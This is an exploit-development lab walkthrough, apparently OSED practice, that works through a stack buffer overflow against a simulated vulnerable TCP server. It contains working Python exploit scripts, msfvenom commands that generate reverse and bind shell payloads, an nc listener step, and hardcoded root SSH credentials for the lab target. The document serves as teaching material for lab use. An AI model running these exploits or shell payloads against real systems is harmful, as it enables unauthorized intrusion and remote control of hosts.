# OSED Lab 1: Vanilla Stack Buffer Overflow

## 🎯 Objectives

By completing this lab, you will:
- Understand basic stack buffer overflow vulnerabilities
- Learn to control the EIP (Extended Instruction Pointer) register
- Practice shellcode injection techniques
- Master fundamental exploit development concepts

## 🔍 Lab Information

- **Difficulty**: Beginner
- **Target OS**: Simulated Windows 7 SP1 (32-bit)
- **Vulnerability**: Stack buffer overflow in TCP server
- **Protections**: NONE (ASLR, DEP, Stack Canaries all disabled)
- **Application**: Custom vulnerable TCP server on port 9999

## 🚀 Getting Started

### 1. Start the Lab

```bash
# Navigate to lab directory
cd labs/osed/beginner/lab01-vanilla

# Start the lab environment
docker-compose up -d

# Check if containers are running
docker-compose ps
```

### 2. Target Information

- **Target IP**: `10.13.{user_id}.10`
- **Vulnerable Service**: TCP port 9999
- **SSH Access**: Port 22 (root:osed123!)

## 🔨 Exploitation Walkthrough

### Phase 1: Reconnaissance & Service Interaction

1. **Connect to the target service**:
```python
#!/usr/bin/env python3
import socket

target_ip = "10.13.{user_id}.10"
target_port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# Receive welcome banner
banner = s.recv(1024)
print(f"Banner: {banner.decode()}")

# Test basic commands
commands = ["HELP", "STATUS", "ECHO test"]
for cmd in commands:
    s.send(cmd.encode() + b"\n")
    response = s.recv(1024)
    print(f"Command: {cmd}")
    print(f"Response: {response.decode()}")
    print("-" * 40)

s.close()
```

2. **Analyze the vulnerable service**:
   - The server accepts input up to 1024 bytes
   - Internal buffer is only 512 bytes
   - No input validation or bounds checking
   - Buffer overflow occurs in `handle_client()` function

### Phase 2: Vulnerability Discovery

1. **Test for buffer overflow**:
```python
#!/usr/bin/env python3
import socket

def test_overflow(payload_size):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.13.{user_id}.10", 9999))
        
        # Skip banner
        s.recv(1024)
        
        # Send oversized payload
        payload = "A" * payload_size
        s.send(payload.encode() + b"\n")
        
        response = s.recv(1024)
        print(f"Payload size {payload_size}: {response.decode().strip()}")
        s.close()
        
    except Exception as e:
        print(f"Payload size {payload_size}: Connection error - {e}")

# Test different payload sizes
for size in [100, 300, 500, 600, 700, 800]:
    test_overflow(size)
```

### Phase 3: EIP Control

1. **Generate unique pattern**:
```bash
# Using Metasploit pattern_create
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 800

# Or using custom Python script
python3 -c "
chars = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9'
print(chars[:800])
"
```

2. **Send pattern and find EIP offset**:
```python
#!/usr/bin/env python3
import socket

# Generated pattern (first 800 characters)
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.13.{user_id}.10", 9999))
    
    # Skip banner
    s.recv(1024)
    
    # Send pattern
    s.send(pattern.encode() + b"\n")
    s.close()
    
    print("Pattern sent. Check debugger or crash logs for EIP value.")
    print("Use pattern_offset.rb to find the exact offset.")
    
except Exception as e:
    print(f"Error: {e}")
```

3. **Verify EIP control** (assuming offset is found at 524):
```python
#!/usr/bin/env python3
import socket

# EIP offset (you need to find this using the pattern)
offset = 524  # This is an example - find the real offset!

# Test EIP control
payload = b"A" * offset + b"BBBB" + b"C" * 100

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.13.{user_id}.10", 9999))
    
    # Skip banner
    s.recv(1024)
    
    # Send payload
    s.send(payload + b"\n")
    s.close()
    
    print("EIP control payload sent.")
    print("Check if EIP contains 0x42424242 (BBBB)")
    
except Exception as e:
    print(f"Error: {e}")
```

### Phase 4: Shellcode Execution

1. **Generate shellcode**:
```bash
# Generate reverse shell payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.13.{user_id}.1 LPORT=4444 -f python -v shellcode -b "\x00\x0a\x0d"

# Or bind shell payload
msfvenom -p windows/shell_bind_tcp LPORT=4445 -f python -v shellcode -b "\x00\x0a\x0d"
```

2. **Final exploit**:
```python
#!/usr/bin/env python3
import socket
import struct

# Configuration
target_ip = "10.13.{user_id}.10"
target_port = 9999
offset = 524  # Replace with your found offset

# Shellcode (generate with msfvenom)
shellcode = (
    b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    b"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    # ... (your generated shellcode here)
)

# Since no protections are enabled, we can jump directly to ESP
# Find a JMP ESP instruction or place shellcode after EIP
eip_value = struct.pack("<L", 0x7c9d30d7)  # Example JMP ESP address

# Build payload
nop_sled = b"\x90" * 32  # NOP sled
payload = (
    b"A" * offset +           # Padding to EIP
    eip_value +               # EIP control (JMP ESP)
    nop_sled +                # NOP sled
    shellcode                 # Our shellcode
)

print(f"Payload length: {len(payload)}")
print("Starting exploit...")

try:
    # Set up listener first
    print("Set up your netcat listener: nc -nvlp 4444")
    input("Press Enter when listener is ready...")
    
    # Connect and exploit
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    
    # Skip banner
    s.recv(1024)
    
    # Send exploit payload
    s.send(payload + b"\n")
    s.close()
    
    print("Exploit sent! Check your listener for shell.")
    
except Exception as e:
    print(f"Exploit failed: {e}")
```

## 🏃‍♂️ Quick Exploitation Steps

For experienced users, here's the condensed version:

1. **Find EIP offset**: `pattern_create.rb -l 800`, send pattern, find crash point
2. **Verify control**: Send `"A"*offset + "BBBB"`, confirm EIP = 0x42424242
3. **Find JMP ESP**: Use `!mona jmp -r esp` or similar to find gadget
4. **Generate shellcode**: `msfvenom -p windows/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f python -b "\x00\x0a\x0d"`
5. **Exploit**: `payload = "A"*offset + jmp_esp + nops + shellcode`

## 🎯 Success Criteria

You have successfully completed this lab when you:

1. **Identify the vulnerability**: Buffer overflow in TCP server
2. **Control EIP register**: Demonstrate precise control of instruction pointer
3. **Execute shellcode**: Get a reverse or bind shell on the target
4. **Capture flags**:
   - User flag: `/home/student/local.txt`
   - Root flag: `/root/proof.txt`

## 🛠 Troubleshooting

### Common Issues:

1. **Connection refused**: Ensure the lab container is running
2. **EIP not controlled**: Double-check your offset calculation
3. **Shellcode not executing**: Verify bad characters and NOP sled
4. **No shell received**: Check firewall and listener setup

### Debug with SSH:
```bash
ssh root@10.13.{user_id}.10  # Password: osed123!
```

### Useful Commands:
```bash
# Check running processes
ps aux | grep vulnerable

# Check network connections
netstat -tlnp

# View crash logs
dmesg | tail -20
```

## 📚 Learning Resources

- **Buffer Overflow Basics**: Understanding stack memory layout
- **x86 Assembly**: Learn basic assembly instructions
- **Debugging Tools**: GDB, WinDbg, Immunity Debugger
- **Shellcode Development**: Writing custom payload code

## 🔄 Next Steps

After completing this lab:

1. Try Lab 2: "Basic SEH" - Structured Exception Handler overflows
2. Practice with different shellcode types (staged, stageless)
3. Learn about exploit mitigations and bypasses
4. Study real-world vulnerability research

## 💡 Tips for Success

1. **Understand the stack**: Draw out memory layout diagrams
2. **Use debuggers**: Attach GDB to see exactly what happens
3. **Practice pattern recognition**: Learn to quickly identify overflows
4. **Document everything**: Keep detailed notes of your process
5. **Experiment freely**: No real systems at risk, try different approaches

---

**Happy Exploit Development!** 🎯

Remember: This is a controlled learning environment. Always practice ethical hacking and only test on systems you own or have explicit permission to test.